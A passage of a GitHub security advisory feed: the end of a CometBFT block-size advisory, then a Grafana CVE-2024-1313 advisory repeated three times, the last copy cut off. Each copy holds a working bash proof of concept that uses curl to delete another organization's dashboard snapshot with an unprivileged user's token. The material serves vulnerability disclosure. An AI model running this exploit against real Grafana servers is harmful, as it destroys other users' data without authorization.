<p>When setting a large <code>BlockParams.MaxBytes</code>, there are two main implications:</p>
<ul>
<li>Increased bandwidth to propagate a block</li>
<li>Increased latency to propagate a block</li>
</ul>
<p>When combined, this may result in less round participation, and in some cases additional rounds may be required to meet the consensus threshold, which could lead to timeouts depending on the topography of a network and environmental factors. These factors can include the number of validators on a network, geographic distribution, network connectivity (including latency, bandwidth, and reachability), the functionality of the modules implementing the logic for a transaction in your chain, etc.&nbsp; The cost to propagate a 21MB block, the default value for <code>BlockParams.MaxBytes</code>, will be far higher than the cost of propagating a smaller 1MB block.&nbsp;CometBFT recommends tuning this parameter to a smaller limit if full initial-round participation is an important quality for your chain.</p>
<h1 id="considerations">Considerations</h1>
<p>CometBFT is designed to be configurable by chains, and implements many different configuration variables and parameters to allow chain developers, validators, node operators, and chain participants to customize it best to their use case. A high-performing validator may find it necessary to experiment with tuning local configuration, optimizing network and compute resources, and implementing controls to inhibit spam.</p>
<h1 id="next-steps-for-chains-and-validators">Next Steps for Chains and Validators</h1>
<p>To increase awareness of the potential impacts of this default parameter, the CometBFT team has updated the documentation (<a href="https://github.com/cometbft/cometbft/pull/1405">https://github.com/cometbft/cometbft/pull/1405</a>, <a href="https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes">v0.34.x</a>, <a href="https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes">v0.37.x</a>, <a href="https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes">v0.38.x</a>) for builders and maintainers of chain applications. Additionally, it is recommended that:</p>
<ul>
<li><p>Chain ecosystems and their maintainers set a <code>BlockParams.MaxBytes</code> configuration appropriate for their use case at the application level; in some cases, fine-tuning <code>BlockParams</code> may require a network upgrade.</p>
</li>
<li><p>Chain ecosystems and their maintainers evaluate how gas is used and required on their chain, including gas and fee parameters, no-fee or fee-exempt message policies, and ensure that any custom modules integrate with the gas and fee frameworks. This is especially important for chains that may have implemented custom modules or functionality to allow IBC messages to bypass fees.</p>
</li>
<li><p>Chain ecosystems and their maintainers audit all of their currently-set parameters and configurations to ensure that they are appropriate for their use case.</p>
</li>
<li><p>All validators develop and implement anti-spam measures on their nodes. Amulet encourages validators to form working groups to collaborate on spam prevention and on tooling that can be implemented by node operators across the Interchain.</p>
</li>
<li><p>All validators consider developing and implementing tooling that would allow them to sample incoming transactions to enable them to fine-tune the level of service they would like to provide to be resilient in slowdown scenarios. Amulet also encourages validators to collaborate on tooling that can be implemented by node operators across the Interchain.</p>
</li>
</ul>
<p>The CometBFT team has also revisited all the checks performed by the consensus protocol regarding proposed blocks. This investigation has confirmed that proposed blocks with size exceeding the <code>BlockParams.MaxBytes</code> limit established by the application are not accepted by nodes. The team notwithstanding has decided to introduce additional sanity checks for the size of proposed blocks (<a href="https://github.com/cometbft/cometbft/pull/1408">https://github.com/cometbft/cometbft/pull/1408</a>), allowing for an early identification and rejection of invalid or oversized blocks. These code changes will be included in the <em>next</em> release of each branch of CometBFT.</p>
<p>As more chains adopt the Interchain Stack for new and cutting-edge use cases, the CometBFT team recommends that all chains regularly evaluate their parameters and configurations to ensure they meet the needs of their ecosystem as their networks mature.&nbsp;</p>
<p>For more information about CometBFT, see <a href="https://docs.cometbft.com/">https://docs.cometbft.com</a>. </p>
<p>This issue was reported via the vulnerability disclosure channel at <a href="mailto:security@interchain.io">security@interchain.io</a> on Friday, September 23, 2023. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.&nbsp;</p>
<hr>
<p>Note from Amulet on the Security Advisory Process:</p>
<p>In the interest of timely resolution of this issue for validators and node operators, the Amulet team has chosen to use existing processes and resources for distributing security advisories within the Cosmos and Interchain Ecosystems. Stay tuned as we implement an improved, more robust security advisory distribution system that will provide equitable access to information about security issues in the Interchain Stack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-hq58-p9mv-338c">https://github.com/cometbft/cometbft/security/advisories/GHSA-hq58-p9mv-338c</a></li>
<li><a href="https://github.com/cometbft/cometbft/pull/1405">https://github.com/cometbft/cometbft/pull/1405</a></li>
<li><a href="https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes">https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes</a></li>
<li><a href="https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes">https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes</a></li>
<li><a href="https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes">https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/0401888bbf6a7148ed039c7cca7380644496c78d">https://github.com/cometbft/cometbft/commit/0401888bbf6a7148ed039c7cca7380644496c78d</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/1f48ff904cc0e1c723c05c72afba86bf0a1ea028">https://github.com/cometbft/cometbft/commit/1f48ff904cc0e1c723c05c72afba86bf0a1ea028</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/28ad4d2230134045e2f5ce9fdab6673e276f2579">https://github.com/cometbft/cometbft/commit/28ad4d2230134045e2f5ce9fdab6673e276f2579</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/fce9dd6e67ee81efe0f4e7442a09016bdae5cfcf">https://github.com/cometbft/cometbft/commit/fce9dd6e67ee81efe0f4e7442a09016bdae5cfcf</a></li>
<li><a href="https://github.com/advisories/GHSA-hq58-p9mv-338c">https://github.com/advisories/GHSA-hq58-p9mv-338c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq58-p9mv-338c</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-09-29T20:38:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana: Users outside an organization can delete a snapshot with its key]]></title>
        <id>https://github.com/advisories/GHSA-67rv-qpw2-6qrr</id>
        <link href="https://github.com/advisories/GHSA-67rv-qpw2-6qrr"/>
        <updated>2024-04-07T07:34:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <em><strong>DELETE /api/snapshots/{key}</strong></em> endpoint allows any Grafana user to delete snapshots if the user is NOT in the organization of the snapshot</p>
<h3 id="details">Details</h3>
<p>An attacker (a user without organization affiliation or with a "no basic role" in an organization other than the one where the dashboard exists), knowing the key or URL of a snapshot created by any user (including Grafana admins), can delete a snapshot (It is not feasible using UI), resulting in a BOLA vulnerability. 
If an attacker is in the same organization of the dashboard snapshot, he can’t delete the snapshot. However, an attacker with low-privilege from a different organization would be able to delete it, resulting in the authorization flaw. </p>
<p><img alt="Screenshot 2024-01-19 at 3 50 23 PM" src="https://user-images.githubusercontent.com/58054904/298194695-bea8ab57-8504-4f5d-9468-cef7acf8622b.png"></p>
<h3 id="precondition">Precondition</h3>
<p>To exploit this endpoint, an attacker must know the {key} of a snapshot. The attacker can potentially discover this key in various ways.</p>
<p>When <a href="https://grafana.com/docs/grafana/latest/developers/http_api/snapshot/">creating a snapshot through the API</a>, users can manually specify a key without any complexity requirements. This lack of complexity makes this key susceptible to brute force attacks. For example, simplistic keys such as "customer_key_123" or "admin_snap" can be easily guessed. These predictable keys allow low-privileged attackers to perform brute-force attacks using common keywords, potentially leading to compromised data integrity.</p>
<p>In addition, this key is displayed in plain text in the URL of a snapshot. This means that if a user publicly displays a snapshot, viewers might note down the key. Furthermore, since the snapshot feature is often used for sharing, displaying, and backing up data, a low-privileged attacker could potentially find snapshot keys in places like the organization's content management system, messaging platform, or shared documents.</p>
<h3 id="poc">PoC</h3>
<pre><code>#!/bin/bash -x

# /snapshots/{key}: {'delete': {'success_status_code': 200, 'exec_paths': ['post /snapshots']}}
# 2d92c726-bf3c-4f20-b979-37bdf81d68c7

# Authentication stage

# User A - Grafana Admin
user_a_token="YWRtaW46YWRtaW4xMjM="

# User B - User with no permissions , which is not part of any org
user_b_token="YmJiOmJiYmJiYmJiYg=="

# Create snapshot
current_date=$(date +%Y-%m-%d-%H-%M-%S)
random_string="random-${current_date}"
snapshot_data='{"dashboard":{"annotations":{"list":[{"name":"Annotations &amp; Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","snapshotData":[],"type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"fiscalYearStartMonth":0,"graphTooltip":0,"id":1517,"links":[],"liveNow":false,"panels":[{"aliasColors":{},"bars":false,"dashLength":10,"dashes":false,"datasource":null,"fill":1,"fillGradient":0,"gridPos":{"h":7,"w":24,"x":0,"y":0},"hiddenSeries":false,"id":4,"legend":{"alignAsTable":true,"avg":false,"current":true,"max":false,"min":false,"rightSide":true,"show":true,"total":false,"values":true},"lines":true,"linewidth":1,"links":[],"nullPointMode":"null","options":{"alertThreshold":true},"percentage":false,"pluginVersion":"10.2.3","pointradius":2,"points":false,"renderer":"flot","seriesOverrides":[],"snapshotData":[{"fields":[{"config":{},"name":"time","type":"time","values":[1704380420234,1704380420334,1704380420434,1704380420534,1704380420634,1704380420734,1704380420834,1704380566535,1704380566635,1704380566735,1704380566835,1704380566935,1704380567035,1704380567135,1704380567235,1704380567335,1704380567435,1704380567535,1704380567635,1704380567735,1704380567835,1704380567935,1704380568035,1704380568135,1704380568235,1704380568335,1704380568435,1704380568535,1704380568635,1704380568735,1704380568835,1704380568935,1704380569035,1704380569135,1704380569235,1704380569335,1704380569435,1704380569535,1704380569635,1704380569735,1704380569835,1704380569935,1704380570035,1704380570135,1704380570235,1704380570335,1704380570435,1704380570535,1704380570635,1704380570735,1704380570835,1704380570935,1704380571035,1704380571135,1704380571235,1704380571335,1704380571435,1704380571535,1704380571635,1704380571735,1704380571835,1704380571935,1704380572035,1704380572135,1704380572235,1704380572335,1704380572435,1704380572535,1704380572635,1704380572735,1704380572835,1704380572935,1704380573035,1704380573135,1704380573235,1704380573335,1704380573435,1704380573535,1704380573635,1704380573735,1704380573835,1704380573935,1704380574035,1704380574135,1704380574235,1704380574335,1704380574435,1704380574535,1704380574635,1704380574735,1704380574835,1704380574935,1704380575035,1704380575135,1704380575235,1704380575335,1704380575435,1704380575535,1704380575635,1704380575735,1704380575835,1704380575935,1704380576035,1704380576135,1704380576235,1704380576335,1704380576435,1704380576535,1704380576635,1704380576735,1704380576835,1704380576935,1704380577035,1704380577135,1704380577235,1704380577335,1704380577435,1704380577535,1704380577635,1704380577735,1704380577835,1704380577935,1704380578035,1704380578135,1704380578235,1704380578335,1704380578435,1704380578535,98.36651881887735,90.90520552302428,100.73967111022498,109.89826524946163,102.00960918579666,106.33530882778683,106.52629457166695,109.56323497328492,116.87832749309237,115.14116509660076,115.70457190523986,118.1091621354617,113.9144753018141,117.58351263310455,117.38409043570634,126.94212224196508,134.50552909930198,127.97490160986311,123.5784401639683,125.31012734609902,118.56171579412602,122.71596068271737,116.11258334902308,118.07532920254557,113.5755959893507,117.02863610131872,122.42991477107806,124.68121765645371,121.45599945829102,120.93643213038477,118.75961398984585,118.70214867496358,116.1085878323934,109.08837112411643,111.90652582288098,109.69360084697551,113.57752983270163,121.0455900847171,116.98257636596624,118.33231004235124,128.19430473604484,119.7539320116394,120.39948913692677,117.05787774775756,109.29564979026497,119.08806090022262,111.20930907183256,104.99629052804383,96.05550719780628,87.99845374253385,83.19203585736912,83.13916797842998,-70.53615047052016,-73.3850420187272]}],"meta":{},"refId":"A"}],"spaceLength":10,"stack":false,"steppedLine":false,"targets":[],"thresholds":[],"timeRegions":[],"title":"Simple dummy streaming example","tooltip":{"shared":true,"sort":0,"value_type":"individual"},"type":"graph","xaxis":{"mode":"time","show":true,"values":[]},"yaxes":[{"format":"short","logBase":1,"show":true},{"format":"short","logBase":1,"show":true}],"yaxis":{"align":false}}],"refresh":"","schemaVersion":39,"snapshot":{"timestamp":"2024-01-04T15:03:04.128Z"},"tags":[],"templating":{"list":[]},"time":{"from":"2024-01-04T15:02:08.132Z","to":"2024-01-04T15:03:08.132Z","raw":{"from":"now-1m","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Simple Streaming Example Snapshot","uid":"TXSTREZ","version":1,"weekStart":""},"name":"Simple Streaming Example Snapshot", "expires":0, "key":"admin_key"}'

create_snapshot_response=$(curl -s -X POST "http://localhost:3000/api/snapshots" -H "Authorization: Basic ${user_a_token}" -H "Content-Type: application/json" -d "${snapshot_data}")

# Extract key from create snapshot response
key=$(echo "$create_snapshot_response" | jq -r '.key')

# Delete snapshot
delete_snapshot_response=$(curl -s -X DELETE "http://localhost:3000/api/snapshots/${key}" -H "Authorization: Basic ${user_b_token}" -o /dev/null -w "%{http_code}")

# Check if the test passed
if [ "$delete_snapshot_response" -eq 200 ]; then
  echo -e "\033[32mTest was passed, BOLA\033[0m"
fi
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-67rv-qpw2-6qrr">https://github.com/grafana/bugbounty/security/advisories/GHSA-67rv-qpw2-6qrr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1313">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-1313">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>
<li><a href="https://github.com/advisories/GHSA-67rv-qpw2-6qrr">https://github.com/advisories/GHSA-67rv-qpw2-6qrr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-67rv-qpw2-6qrr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-05T19:29:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana: Users outside an organization can delete a snapshot with its key]]></title>
        <id>https://github.com/advisories/GHSA-67rv-qpw2-6qrr</id>
        <link href="https://github.com/advisories/GHSA-67rv-qpw2-6qrr"/>
        <updated>2024-04-07T07:34:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <em><strong>DELETE /api/snapshots/{key}</strong></em> endpoint allows any Grafana user to delete snapshots if the user is NOT in the organization of the snapshot</p>
<h3 id="details">Details</h3>
<p>An attacker (a user without organization affiliation or with a "no basic role" in an organization other than the one where the dashboard exists), knowing the key or URL of a snapshot created by any user (including Grafana admins), can delete a snapshot (It is not feasible using UI), resulting in a BOLA vulnerability. 
If an attacker is in the same organization of the dashboard snapshot, he can’t delete the snapshot. However, an attacker with low-privilege from a different organization would be able to delete it, resulting in the authorization flaw. </p>
<p><img alt="Screenshot 2024-01-19 at 3 50 23 PM" src="https://user-images.githubusercontent.com/58054904/298194695-bea8ab57-8504-4f5d-9468-cef7acf8622b.png"></p>
<h3 id="precondition">Precondition</h3>
<p>To exploit this endpoint, an attacker must know the {key} of a snapshot. The attacker can potentially discover this key in various ways.</p>
<p>When <a href="https://grafana.com/docs/grafana/latest/developers/http_api/snapshot/">creating a snapshot through the API</a>, users can manually specify a key without any complexity requirements. This lack of complexity makes this key susceptible to brute force attacks. For example, simplistic keys such as "customer_key_123" or "admin_snap" can be easily guessed. These predictable keys allow low-privileged attackers to perform brute-force attacks using common keywords, potentially leading to compromised data integrity.</p>
<p>In addition, this key is displayed in plain text in the URL of a snapshot. This means that if a user publicly displays a snapshot, viewers might note down the key. Furthermore, since the snapshot feature is often used for sharing, displaying, and backing up data, a low-privileged attacker could potentially find snapshot keys in places like the organization's content management system, messaging platform, or shared documents.</p>
<h3 id="poc">PoC</h3>
<pre><code>#!/bin/bash -x

# /snapshots/{key}: {'delete': {'success_status_code': 200, 'exec_paths': ['post /snapshots']}}
# 2d92c726-bf3c-4f20-b979-37bdf81d68c7

# Authentication stage

# User A - Grafana Admin
user_a_token="YWRtaW46YWRtaW4xMjM="

# User B - User with no permissions , which is not part of any org
user_b_token="YmJiOmJiYmJiYmJiYg=="

# Create snapshot
current_date=$(date +%Y-%m-%d-%H-%M-%S)
random_string="random-${current_date}"
snapshot_data='{"dashboard":{"annotations":{"list":[{"name":"Annotations &amp; Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","snapshotData":[],"type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"fiscalYearStartMonth":0,"graphTooltip":0,"id":1517,"links":[],"liveNow":false,"panels":[{"aliasColors":{},"bars":false,"dashLength":10,"dashes":false,"datasource":null,"fill":1,"fillGradient":0,"gridPos":{"h":7,"w":24,"x":0,"y":0},"hiddenSeries":false,"id":4,"legend":{"alignAsTable":true,"avg":false,"current":true,"max":false,"min":false,"rightSide":true,"show":true,"total":false,"values":true},"lines":true,"linewidth":1,"links":[],"nullPointMode":"null","options":{"alertThreshold":true},"percentage":false,"pluginVersion":"10.2.3","pointradius":2,"points":false,"renderer":"flot","seriesOverrides":[],"snapshotData":[{"fields":[{"config":{},"name":"time","type":"time","values":[1704380420234,1704380420334,1704380420434,1704380420534,1704380420634,1704380420734,1704380420834,1704380566535,1704380566635,1704380566735,1704380566835,1704380566935,1704380567035,1704380567135,1704380567235,1704380567335,1704380567435,1704380567535,1704380567635,1704380567735,1704380567835,1704380567935,1704380568035,1704380568135,1704380568235,1704380568335,1704380568435,1704380568535,1704380568635,1704380568735,1704380568835,1704380568935,1704380569035,1704380569135,1704380569235,1704380569335,1704380569435,1704380569535,1704380569635,1704380569735,1704380569835,1704380569935,1704380570035,1704380570135,1704380570235,1704380570335,1704380570435,1704380570535,1704380570635,1704380570735,1704380570835,1704380570935,1704380571035,1704380571135,1704380571235,1704380571335,1704380571435,1704380571535,1704380571635,1704380571735,1704380571835,1704380571935,1704380572035,1704380572135,1704380572235,1704380572335,1704380572435,1704380572535,1704380572635,1704380572735,1704380572835,1704380572935,1704380573035,1704380573135,1704380573235,1704380573335,1704380573435,1704380573535,1704380573635,1704380573735,1704380573835,1704380573935,1704380574035,1704380574135,1704380574235,1704380574335,1704380574435,1704380574535,1704380574635,1704380574735,1704380574835,1704380574935,1704380575035,1704380575135,1704380575235,1704380575335,1704380575435,1704380575535,1704380575635,1704380575735,1704380575835,1704380575935,1704380576035,1704380576135,1704380576235,1704380576335,1704380576435,1704380576535,1704380576635,1704380576735,1704380576835,1704380576935,1704380577035,1704380577135,1704380577235,1704380577335,1704380577435,1704380577535,1704380577635,1704380577735,1704380577835,1704380577935,1704380578035,1704380578135,1704380578235,1704380578335,1704380578435,1704380578535,98.36651881887735,90.90520552302428,100.73967111022498,109.89826524946163,102.00960918579666,106.33530882778683,106.52629457166695,109.56323497328492,116.87832749309237,115.14116509660076,115.70457190523986,118.1091621354617,113.9144753018141,117.58351263310455,117.38409043570634,126.94212224196508,134.50552909930198,127.97490160986311,123.5784401639683,125.31012734609902,118.56171579412602,122.71596068271737,116.11258334902308,118.07532920254557,113.5755959893507,117.02863610131872,122.42991477107806,124.68121765645371,121.45599945829102,120.93643213038477,118.75961398984585,118.70214867496358,116.1085878323934,109.08837112411643,111.90652582288098,109.69360084697551,113.57752983270163,121.0455900847171,116.98257636596624,118.33231004235124,128.19430473604484,119.7539320116394,120.39948913692677,117.05787774775756,109.29564979026497,119.08806090022262,111.20930907183256,104.99629052804383,96.05550719780628,87.99845374253385,83.19203585736912,83.13916797842998,-70.53615047052016,-73.3850420187272]}],"meta":{},"refId":"A"}],"spaceLength":10,"stack":false,"steppedLine":false,"targets":[],"thresholds":[],"timeRegions":[],"title":"Simple dummy streaming example","tooltip":{"shared":true,"sort":0,"value_type":"individual"},"type":"graph","xaxis":{"mode":"time","show":true,"values":[]},"yaxes":[{"format":"short","logBase":1,"show":true},{"format":"short","logBase":1,"show":true}],"yaxis":{"align":false}}],"refresh":"","schemaVersion":39,"snapshot":{"timestamp":"2024-01-04T15:03:04.128Z"},"tags":[],"templating":{"list":[]},"time":{"from":"2024-01-04T15:02:08.132Z","to":"2024-01-04T15:03:08.132Z","raw":{"from":"now-1m","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Simple Streaming Example Snapshot","uid":"TXSTREZ","version":1,"weekStart":""},"name":"Simple Streaming Example Snapshot", "expires":0, "key":"admin_key"}'

create_snapshot_response=$(curl -s -X POST "http://localhost:3000/api/snapshots" -H "Authorization: Basic ${user_a_token}" -H "Content-Type: application/json" -d "${snapshot_data}")

# Extract key from create snapshot response
key=$(echo "$create_snapshot_response" | jq -r '.key')

# Delete snapshot
delete_snapshot_response=$(curl -s -X DELETE "http://localhost:3000/api/snapshots/${key}" -H "Authorization: Basic ${user_b_token}" -o /dev/null -w "%{http_code}")

# Check if the test passed
if [ "$delete_snapshot_response" -eq 200 ]; then
  echo -e "\033[32mTest was passed, BOLA\033[0m"
fi
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-67rv-qpw2-6qrr">https://github.com/grafana/bugbounty/security/advisories/GHSA-67rv-qpw2-6qrr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1313">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2024-1313">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>
<li><a href="https://github.com/advisories/GHSA-67rv-qpw2-6qrr">https://github.com/advisories/GHSA-67rv-qpw2-6qrr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-67rv-qpw2-6qrr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-05T19:29:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana: Users outside an organization can delete a snapshot with its key]]></title>
        <id>https://github.com/advisories/GHSA-67rv-qpw2-6qrr</id>
        <link href="https://github.com/advisories/GHSA-67rv-qpw2-6qrr"/>
        <updated>2024-04-07T07:34:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <em><strong>DELETE /api/snapshots/{key}</strong></em> endpoint allows any Grafana user to delete snapshots if the user is NOT in the organization of the snapshot</p>
<h3 id="details">Details</h3>
<p>An attacker (a user without organization affiliation or with a "no basic role" in an organization other than the one where the dashboard exists), knowing the key or URL of a snapshot created by any user (including Grafana admins), can delete a snapshot (It is not feasible using UI), resulting in a BOLA vulnerability. 
If an attacker is in the same organization of the dashboard snapshot, he can’t delete the snapshot. However, an attacker with low-privilege from a different organization would be able to delete it, resulting in the authorization flaw. </p>
<p><img alt="Screenshot 2024-01-19 at 3 50 23 PM" src="https://user-images.githubusercontent.com/58054904/298194695-bea8ab57-8504-4f5d-9468-cef7acf8622b.png"></p>
<h3 id="precondition">Precondition</h3>
<p>To exploit this endpoint, an attacker must know the {key} of a snapshot. The attacker can potentially discover this key in various ways.</p>
<p>When <a href="https://grafana.com/docs/grafana/latest/developers/http_api/snapshot/">creating a snapshot through the API</a>, users can manually specify a key without any complexity requirements. This lack of complexity makes this key susceptible to brute force attacks. For example, simplistic keys such as "customer_key_123" or "admin_snap" can be easily guessed. These predictable keys allow low-privileged attackers to perform brute-force attacks using common keywords, potentially leading to compromised data integrity.</p>
<p>In addition, this key is displayed in plain text in the URL of a snapshot. This means that if a user publicly displays a snapshot, viewers might note down the key. Furthermore, since the snapshot feature is often used for sharing, displaying, and backing up data, a low-privileged attacker could potentially find snapshot keys in places like the organization's content management system, messaging platform, or shared documents.</p>
<h3 id="poc">PoC</h3>
<pre><code>#!/bin/bash -x

# /snapshots/{key}: {'delete': {'success_status_code': 200, 'exec_paths': ['post /snapshots']}}
# 2d92c726-bf3c-4f20-b979-37bdf81d68c7

# Authentication stage

# User A - Grafana Admin
user_a_token="YWRtaW46YWRtaW4xMjM="

# User B - User with no permissions , which is not part of any org
user_b_token="YmJiOmJiYmJiYmJiYg=="

# Create snapshot
current_date=$(date +%Y-%m-%d-%H-%M-%S)
random_string="random-${current_date}"
snapshot_data='{"dashboard":{"annotations":{"list":[{"name":"Annotations &amp; Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","snapshotData":[],"type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"fiscalYearStartMonth":0,"graphTooltip":0,"id":1517,"links":[],"liveNow":false,"panels":[{"aliasColors":{},"bars":false,"dashLength":10,"dashes":false,"datasource":null,"fill":1,"fillGradient":0,"gridPos":{"h":7,"w":24,"x":0,"y":0},"hiddenSeries":false,"id":4,"legend":{"alignAsTable":true,"avg":false,"current":true,"max":false,"min":false,"rightSide":true,"show":true,"total":false,"values":true},"lines":true,"linewidth":1,"links":[],"nullPointMode":"null","options":{"alertThreshold":true},"percentage":false,"pluginVersion":"10.2.3","pointradius":2,"points":false,"renderer":"flot","seriesOverrides":[],"snapshotData":[{"fields":[{"config":{},"name":"time","type":"time","values":[1704380420234,1704380420334,1704380420434,1704380420534,1704380420634,1704380420734,1704380420834,1704380566535,1704380566635,1704380566735,1704380566835,1704380566935,1704380567035,1704380567135,1704380567235,1704380567335,1704380567435,1704380567535,1704380567635,1704380567735,1704380567835,1704380567935,1704380568035,1704380568135,1704380568235,1704380568335,1704380568435,1704380568535,1704380568635,1704380568735,1704380568835,1704380568935,1704380569035,1704380569135,1704380569235,1704380569335,1704380569435,1704380569535,1704380569635,1704380569735,1704380569835,1704380569935,1704380570035,1704380570135,1704380570235,1704380570335,1704380570435,1704380570535,1704380570635,1704380570735,1704380570835,1704380570935,1704380571035,1704380571135,1704380571235,1704380571335,1704380571435,1704380571535,1704380571635,1704380571735,1704380571835,1704380571935,1704380572035,1704380572135,1704380572235,1704380572335,1704380572435,1704380572535,1704380572635,1704380572735,1704380572835,1704380572935,1704380573035,1704380573135,1704380573235,1704380573335,1704380573435,1704380573535,1704380573635,1704380573735,1704380573835,1704380573935,1704380574035,1704380574135,1704380574235,1704380574335,1704380574435,1704380574535,1704380574635,1704380574735,1704380574835,1704380574935,1704380575035,1704380575135,1704380575235,1704380575335,1704380575435,1704380575535,1704380575635,1704380575735,1704380575835,1704380575935,1704380576035,1704380576135,1704380576235,1704380576335,1704380576435,1704380576535,1704380576635,1704380576735,1704380576835,1704380576935,1704380577035,1704380577135,1704380577235,1704380577335,1704380577435,1704380577535,1704380577635,1704380577735,1704380577835,1704380577935,1704380578035,1704380578135,1704380578235,1704380578335,1704380578435,1704380578535,98.36651881887735,90.90520552302428,100.73967111022498,109.89826524946163,102.00960918579666,106.33530882778683,106.52629457166695,109.56323497328492,116.87832749309237,115.14116509660076,115.70457190523986,118.1091621354617,113.9144753018141,117.58351263310455,117.38409043570634,126.94212224196508,134.50552909930198,127.97490160986311,123.5784401639683,125.31012734609902,118.56171579412602,122.71596068271737,116.11258334902308,118.07532920254557,113.5755959893507,117.02863610131872,122.42991477107806,124.68121765645371,121.45599945829102,120.93643213038477,118.75961398984585,118.70214867496358,116.1085878323934,109.08837112411643,111.90652582288098,109.69360084697551,113.57752983270163,121.0455900847171,116.98257636596624,118.33231004235124,128.19430473604484,119.7539320116394,120.39948913692677,117.05787774775756,109.29564979026497,119.08806090022262,111.20930907183256,104.99629052804383,96.05550719780628,87.99845374253385,83.19203585736912,83.13916797842998,-70.53615047052016,-73.3850420187272]}],"meta":{},"refId":"A"}],"spaceLength":10,"stack":false,"steppedLine":false,"targets":[],"thresholds":[],"timeRegions":[],"title":"Simple dummy streaming example","tooltip":{"shared":true,"sort":0,"value_type":"individual"},"type":"graph","xaxis":{"mode":"time","show":true,"values":[]},"yaxes":[{"format":"short","logBase":1,"show":true},{"format":"short","logBase":1,"show":true}],"yaxis":{"align":false}}],"refresh":"","schemaVersion":39,"snapshot":{"timestamp":"2024-01-04T15:03:04.128Z"},"tags":[],"templating":{"list":[]},"time":{"from":"2024-01-04T15:02:08.132Z","to":"2024-01-04T15:03:08.132Z","raw":{"from":"now-1m","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Simple Streaming Example Snapshot","uid":"TXSTREZ","version":1,"weekStart":""},"name":"Simple Streaming Example Snapshot", "expires":0, "key":"admin_key"}'

create_snapshot_response=$(curl -s -X POST "http://localhost:3000/api/snapshots" -H "Authorization: Basic ${user_a_token}" -H "Content-Type: application/json" -d "${snapshot_data}")

# Extract key from create snapshot response
key=$(echo "$create_snapshot_response" | jq -r '.key')

# Delete snapshot
delete_snapshot_response=$(curl -s -X DELETE "http://localhost:3000/api/snapshots/${key}" -H "Authorization: Basic ${user_b_token}" -o /dev/null -w "%{http_code}")

# Check if the test passed
if [ "$delete_snapshot_response" -eq 200 ]; then
  echo -e "\033[32mTest was passed, BOLA\033[0m"
fi
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-67rv-qpw2-6qrr">https://github.com/grafana/bugbounty/security/advisories/GHSA-67rv-qpw2-6qrr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1313">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>
